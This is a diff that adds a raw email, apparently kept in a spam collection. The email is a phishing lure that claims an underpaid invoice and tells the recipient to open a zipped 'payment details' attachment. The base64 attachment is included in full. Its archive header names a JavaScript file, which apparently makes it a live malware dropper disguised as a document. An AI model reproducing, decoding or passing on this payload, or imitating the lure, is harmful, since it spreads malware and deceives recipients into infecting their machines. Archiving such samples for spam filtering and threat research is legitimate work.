@@ -1,0 +1,115 @@
+Return-Path: <Cross.Lana@static.vnpt.vn>
+Received: from vg-cb006.ocn.ad.jp (vg-kg004.ocn.ad.jp [122.1.234.57])
+	by art-printing.co.jp (Postfix) with ESMTP id 0907A3F01746
+	for <tento-research@art-printing.co.jp>; Wed, 23 Nov 2016 22:27:08 +0900 (JST)
+Received: from b-oaf0022.ocn.ad.jp (b-oaf0022.ocn.ad.jp [153.128.48.49])
+	by vg-cb006.ocn.ad.jp (Postfix) with ESMTP id E2E09700268
+	for <tento-research@art-printing.co.jp>; Wed, 23 Nov 2016 22:27:07 +0900 (JST)
+Received: from of-omf-fcb025.ocn.ad.jp (of-omf-fcb025.ocn.ad.jp [153.149.144.67])
+	by b-oaf0022.ocn.ad.jp (Postfix) with ESMTP id C5EFE200283
+	for <tento-research@art-printing.co.jp>; Wed, 23 Nov 2016 22:27:07 +0900 (JST)
+Received: from of-omf-fcb025 (localhost [127.0.0.1])
+	by of-omf-fcb025.ocn.ad.jp  with ESMTP id uANDR7uO018193
+	for <tento-research@art-printing.co.jp>; Wed, 23 Nov 2016 22:27:07 +0900
+Received: from of-omf-fcb025.ocn.ad.jp with LMTP by of-omf-fcb025 (3.2.0/sieved-3-2-SW-build-1409)
+	for <tento-research@art-printing.co.jp>; Wed, 23 Nov 2016 22:27:07 +0900
+Received: from ntt.pod01.ov-mta-ucb012 (ov-mta-ucb012.ocn.ad.jp [153.149.210.226])
+	by of-omf-fcb025.ocn.ad.jp  with ESMTP id uANDR72S018180
+	for <tento-research@art-printing.co.jp>; Wed, 23 Nov 2016 22:27:07 +0900
+Received: from ofmgw022.ocn.ad.jp ([153.149.229.70])
+	by ntt.pod01.ov-mta-ucb012 with 
+	id BRT71u0061Xmj6101RT7Nv; Wed, 23 Nov 2016 13:27:07 +0000
+Received-SPF: none (OCN: of-ofc-ucb022: transitioning domain does not provide an SPF record) client-ip=14.165.45.83; envelope-from=<Cross.Lana@static.vnpt.vn>; helo=static.vnpt.vn;
+Authentication-Results: of-ofc-ucb022; spf=none smtp.mailfrom=Cross.Lana@static.vnpt.vn
+Received: from static.vnpt.vn (unknown [14.165.45.83])
+	by ofmgw022.ocn.ad.jp (Postfix) with ESMTP id 3A70D100246
+	for <tento-research@art-printing.co.jp>; Wed, 23 Nov 2016 22:27:07 +0900 (JST)
+Received: from internal (unknown [x.x.x.x])
+Received: (nullmailer pid 75559 invoked by uid 690);
+	Wed, 23 Nov 2016 20:27:53 +0700
+To: <tento-research@art-printing.co.jp>
+Subject: [MEIWAKU!!] Please Pay Attention
+X-PHP-Originating-Script: 690:SendMail.class.php
+From: "Lana Cross" <Cross.Lana@static.vnpt.vn>
+Date: Wed, 23 Nov 2016 20:27:53 +0700
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary="582b707c2aebea3f0750da8097e4667c"
+Message-Id: <5081105951.414045.35248.SendMail@art-printing.co.jp>
+X-OCN-SPAM-CHECK: 100.00%
+X-OCN-ANALYSIS: v=2.1 cv=VZjtRwd9 c=1 sm=1 tr=0
+	p=F0dwcM/v7qRL7lrAojhWLg==:17 p=2fka3wjEJ6BlJh6NRgwA:9
+	p=ddFNkW6GA0iHEpF4NQjF:22 a=6tMmormsWpXFGAnll0c81Q==:117 a=L9H7d07YOLsA:10
+	a=9cW_t1CCXrUA:10 a=s5jvgZ67dGcA:10 a=xxPYsWa9ij0A:10 a=L24OOQBejmoA:10
+	a=sZwACCl5b876xB8Q:21 a=lx0_z9nd1ebjaeP8:21 a=wPNLvfGTeEIA:10
+	a=BG37Zz7-arL-uchkKFwA:9 a=IKIoO-ieCDEA:10 a=5MxXyNQ-P-6J4PTiW665:22
+	a=2Mov_2Roe7evb4wa81Bp:22 a=CrrT7yTaSaEUEJD5gDPb:22
+
+--582b707c2aebea3f0750da8097e4667c
+Content-type: text/plain; charset=iso-8859-1
+Content-Transfer-Encoding: quoted-printable
+
+Dear tento-research, we have received your payment but the amount was =
+not full.
+Probably, this occurred due to taxes we take from the amount.
+All the details are in the attachment - please check it out.
+--582b707c2aebea3f0750da8097e4667c
+Content-Type: application/zip; name="lastpayment_tento-research.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="lastpayment_tento-research.zip"
+
+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
+AAAAAA==
+--582b707c2aebea3f0750da8097e4667c--
